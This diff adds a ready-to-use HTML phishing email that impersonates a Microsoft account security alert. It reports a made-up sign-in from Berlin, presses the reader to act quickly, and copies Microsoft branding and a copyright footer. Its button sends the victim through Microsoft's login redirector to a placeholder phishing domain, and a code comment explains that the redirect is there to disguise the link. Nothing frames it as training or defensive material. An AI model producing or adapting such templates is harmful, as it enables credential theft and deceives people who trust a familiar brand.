@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Microsoft Account Security</title>
+  <style>
+    body { font-family: Segoe UI, Arial, sans-serif; background: #f3f3f3; margin: 0; padding: 20px; }
+    .container { max-width: 600px; margin: auto; background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+    .header { background: #0078d4; padding: 20px; text-align: center; }
+    .header img { height: 40px; }
+    .content { padding: 30px; }
+    .btn { display: inline-block; background: #0078d4; color: white; text-decoration: none; padding: 12px 24px; border-radius: 4px; font-weight: bold; margin: 20px 0; }
+    .footer { padding: 15px; font-size: 12px; color: #666; text-align: center; border-top: 1px solid #eee; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft">
+    </div>
+    <div class="content">
+      <h2>Unusual sign-in attempt detected</h2>
+      <p>We noticed a sign-in attempt to your Microsoft account from a new device:</p>
+      <ul>
+        <li><strong>Location:</strong> Berlin, Germany</li>
+        <li><strong>Device:</strong> Windows 10 • Chrome</li>
+        <li><strong>Time:</strong> Today at 14:23 UTC</li>
+      </ul>
+      <p>If this wasn’t you, <strong>secure your account immediately</strong>.</p>
+      <!-- Obfuscated link via Microsoft's own redirector -->
+      <a href="https://login.microsoftonline.com/redirect?url=https://your-phishing-domain.com/microsoft-login" class="btn">Review Sign-In Activity</a>
+      <p>This link expires in 24 hours for security.</p>
+    </div>
+    <div class="footer">
+      © 2025 Microsoft Corporation. All rights reserved.<br>
+      Microsoft, Windows, and Azure are trademarks of Microsoft Corporation.
+    </div>
+  </div>
+</body>
+</html>
